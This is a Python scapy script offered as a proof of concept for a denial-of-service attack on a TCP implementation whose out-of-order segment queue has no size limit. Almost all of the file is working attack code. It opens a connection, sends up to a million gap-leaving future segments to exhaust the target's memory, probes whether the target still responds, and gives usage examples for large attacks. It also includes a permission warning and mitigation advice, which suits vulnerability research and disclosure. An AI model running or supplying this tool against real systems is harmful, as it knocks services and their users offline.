#!/usr/bin/env python3
"""
Out-of-Order Segment Memory Exhaustion DoS PoC

Demonstrates unbounded growth of the out-of-order segment queue in segment.ml.
The receive queue (segs: S.t) has no size limit, allowing attackers to exhaust
target memory by sending many future segments.

This PoC:
1. Establishes a valid TCP connection
2. Sends many segments with future sequence numbers
3. Each segment is queued waiting for missing segments
4. Queue grows unbounded until memory exhausted

Author: Security Research
License: Educational/Research Use Only
"""

import argparse
import sys
import time
from scapy.all import *

class OOOSegmentDoS:
    def __init__(self, target_ip, target_port, source_port=None, num_segments=1000, segment_size=1460):
        self.target_ip = target_ip
        self.target_port = target_port
        self.source_port = source_port or random.randint(10000, 65000)
        self.num_segments = num_segments
        self.segment_size = segment_size
        self.packets_sent = 0
        self.conn_state = None

    def establish_connection(self):
        """Establish a real TCP connection"""
        print(f"[*] Establishing connection to {self.target_ip}:{self.target_port}")

        ip = IP(dst=self.target_ip)
        syn = TCP(sport=self.source_port, dport=self.target_port,
                  flags='S', seq=1000)
        syn_ack = sr1(ip/syn, timeout=2, verbose=0)

        if not syn_ack or not syn_ack.haslayer(TCP) or syn_ack[TCP].flags != 'SA':
            print("[-] Failed to complete handshake")
            return None

        print(f"[+] Received SYN-ACK (seq={syn_ack[TCP].seq})")

        # Complete handshake
        ack = TCP(sport=self.source_port, dport=self.target_port,
                  flags='A', seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1)
        send(ip/ack, verbose=0)

        print("[+] Connection established")

        return {
            'our_seq': syn_ack[TCP].ack,
            'their_seq': syn_ack[TCP].seq + 1,
            'window': syn_ack[TCP].window
        }

    def send_ooo_segments(self):
        """Send out-of-order segments to fill the queue"""
        if not self.conn_state:
            print("[-] No connection established")
            return False

        print(f"\n[*] Sending {self.num_segments} out-of-order segments")
        print(f"[*] Segment size: {self.segment_size} bytes")
        print(f"[*] Expected memory usage: ~{(self.num_segments * self.segment_size) / (1024*1024):.1f} MB")
        print(f"[*] This will take a few moments...\n")

        ip = IP(dst=self.target_ip)
        start_time = time.time()

        # Strategy: Send segments with incrementing future sequence numbers
        # Each segment creates a gap that can never be filled (we never send the missing data)
        # The implementation will queue all of them waiting for the missing segments

        base_seq = self.conn_state['our_seq']
        window = self.conn_state['window']

        # Send segments spread across the sequence space
        # We skip every other segment to create maximum fragmentation
        for i in range(self.num_segments):
            # Calculate sequence number for this segment
            # Skip by 2*segment_size to leave gaps
            seq_offset = i * (self.segment_size * 2)
            seq = base_seq + seq_offset

            # Create payload
            payload = b'X' * self.segment_size

            # Send segment with future sequence number
            pkt = TCP(sport=self.source_port, dport=self.target_port,
                     flags='A', seq=seq, ack=self.conn_state['their_seq'])

            send(ip/pkt/payload, verbose=0)
            self.packets_sent += 1

            # Progress indicator
            if (i + 1) % 100 == 0:
                elapsed = time.time() - start_time
                rate = (i + 1) / elapsed if elapsed > 0 else 0
                progress = ((i + 1) / self.num_segments) * 100
                print(f"\r[*] Progress: {progress:.1f}% ({i+1}/{self.num_segments}) | "
                      f"Rate: {rate:.1f} pps | Elapsed: {elapsed:.1f}s",
                      end='', flush=True)

        elapsed = time.time() - start_time
        print(f"\n\n[+] Sent {self.packets_sent} out-of-order segments in {elapsed:.2f} seconds")
        print(f"[+] Average rate: {self.packets_sent / elapsed:.2f} pps")

        return True

    def test_connection_responsiveness(self):
        """Test if the connection is still responsive after attack"""
        print("\n[*] Testing connection responsiveness...")

        ip = IP(dst=self.target_ip)

        # Try to send in-order data
        payload = b"PING-TEST"
        seq = self.conn_state['our_seq']
        pkt = TCP(sport=self.source_port, dport=self.target_port,
                 flags='PA', seq=seq, ack=self.conn_state['their_seq'])

        # Send and wait for response
        response = sr1(ip/pkt/payload, timeout=5, verbose=0)

        if response and response.haslayer(TCP):
            print(f"[+] Connection still responsive (got {response[TCP].flags})")
            if response.haslayer(Raw):
                print(f"[+] Received data: {response[Raw].load}")
            return True
        else:
            print("[-] Connection appears unresponsive!")
            print("[-] Target may be overwhelmed or queue is blocking")
            return False

    def send_duplicate_acks(self, count=10):
        """Send duplicate ACKs to potentially trigger fast retransmit"""
        print(f"\n[*] Sending {count} duplicate ACKs...")

        ip = IP(dst=self.target_ip)
        ack_pkt = TCP(sport=self.source_port, dport=self.target_port,
                     flags='A', seq=self.conn_state['our_seq'],
                     ack=self.conn_state['their_seq'])

        for i in range(count):
            send(ip/ack_pkt, verbose=0)
            time.sleep(0.01)

        print(f"[+] Sent {count} duplicate ACKs")

    def analyze_impact(self):
        """Analyze the impact of the attack"""
        print("\n" + "="*60)
        print("ATTACK ANALYSIS")
        print("="*60)

        total_data = self.packets_sent * self.segment_size
        print(f"Segments Sent:        {self.packets_sent}")
        print(f"Segment Size:         {self.segment_size} bytes")
        print(f"Total Data Sent:      {total_data / (1024*1024):.2f} MB")
        print(f"Expected Queue Size:  ~{total_data / (1024*1024):.2f} MB")
        print()
        print("EXPECTED EFFECTS:")
        print("  1. Out-of-order queue grows unbounded")
        print("  2. Memory consumption increases significantly")
        print("  3. Connection may become unresponsive")
        print("  4. Other connections may be affected (global memory pressure)")
        print()

        if self.packets_sent >= 10000:
            print("SEVERITY: HIGH")
            print("  - Large number of segments sent")
            print("  - Significant memory consumption expected")
            print("  - Likely to cause noticeable impact")
        elif self.packets_sent >= 1000:
            print("SEVERITY: MEDIUM")
            print("  - Moderate number of segments sent")
            print("  - Should demonstrate the vulnerability")
        else:
            print("SEVERITY: LOW")
            print("  - Small test, may not show clear impact")
            print("  - Increase --segments for more dramatic effect")

        print("\nMITIGATION:")
        print("  - Implement maximum out-of-order queue size (e.g., 100 segments)")
        print("  - Drop oldest OOO segments when limit reached")
        print("  - Consider memory limits per connection")
        print("="*60)

    def run_attack(self):
        """Execute the full attack sequence"""
        # Establish connection
        self.conn_state = self.establish_connection()
        if not self.conn_state:
            return False

        time.sleep(1)

        # Send out-of-order segments
        if not self.send_ooo_segments():
            return False

        time.sleep(2)

        # Test if connection is still responsive
        self.test_connection_responsiveness()

        # Send duplicate ACKs (might trigger interesting behavior)
        self.send_duplicate_acks()

        time.sleep(1)

        # Final responsiveness test
        self.test_connection_responsiveness()

        # Analyze impact
        self.analyze_impact()

        print("\n[*] Attack complete. Monitor target for:")
        print("    - Increased memory usage")
        print("    - Reduced responsiveness")
        print("    - Connection timeouts")

        return True

def main():
    parser = argparse.ArgumentParser(
        description='Out-of-Order Segment Memory Exhaustion DoS PoC',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Small test (1000 segments ~1.4 MB)
  sudo python3 ooo_segment_dos.py --target 10.0.0.2 --port 8080 --segments 1000

  # Medium test (10000 segments ~14 MB)
  sudo python3 ooo_segment_dos.py --target 10.0.0.2 --port 8080 --segments 10000

  # Large test (100000 segments ~140 MB)
  sudo python3 ooo_segment_dos.py --target 10.0.0.2 --port 8080 --segments 100000

  # Custom segment size
  sudo python3 ooo_segment_dos.py --target 10.0.0.2 --port 8080 --segments 5000 --size 512

Warning:
  This attack can cause significant memory consumption and service disruption.
  Only use against systems you own or have explicit permission to test.
        """)

    parser.add_argument('--target', required=True, help='Target IP address')
    parser.add_argument('--port', type=int, required=True, help='Target TCP port')
    parser.add_argument('--sport', type=int, help='Source port (random if not specified)')
    parser.add_argument('--segments', type=int, default=1000,
                       help='Number of OOO segments to send (default: 1000)')
    parser.add_argument('--size', type=int, default=1460,
                       help='Segment size in bytes (default: 1460)')

    args = parser.parse_args()

    # Validate arguments
    if args.segments <= 0 or args.segments > 1000000:
        print("[-] Segments must be between 1 and 1000000")
        sys.exit(1)

    if args.size <= 0 or args.size > 65535:
        print("[-] Segment size must be between 1 and 65535")
        sys.exit(1)

    # Check for root
    if os.geteuid() != 0:
        print("[-] This script requires root privileges")
        print("[-] Please run with sudo")
        sys.exit(1)

    print("""
╔═══════════════════════════════════════════════════════════╗
║    Out-of-Order Segment Memory Exhaustion DoS PoC         ║
║    Unbounded Queue Vulnerability Test                     ║
╚═══════════════════════════════════════════════════════════╝
""")

    print(f"Target:        {args.target}:{args.port}")
    print(f"Segments:      {args.segments}")
    print(f"Segment Size:  {args.size} bytes")
    print(f"Expected Mem:  ~{(args.segments * args.size) / (1024*1024):.1f} MB")
    print()

    # Warning for large attacks
    if args.segments > 50000:
        print("⚠️  WARNING: Large attack configured!")
        print(f"   This will send ~{(args.segments * args.size) / (1024*1024):.0f} MB of data")
        print("   Target may become unresponsive or crash")
        print()

    # Confirm
    try:
        confirm = input("Proceed with attack? [y/N]: ")
        if confirm.lower() != 'y':
            print("Aborted.")
            sys.exit(0)
    except KeyboardInterrupt:
        print("\nAborted.")
        sys.exit(0)

    # Run attack
    attacker = OOOSegmentDoS(args.target, args.port, args.sport,
                             args.segments, args.size)
    attacker.run_attack()

if __name__ == '__main__':
    main()
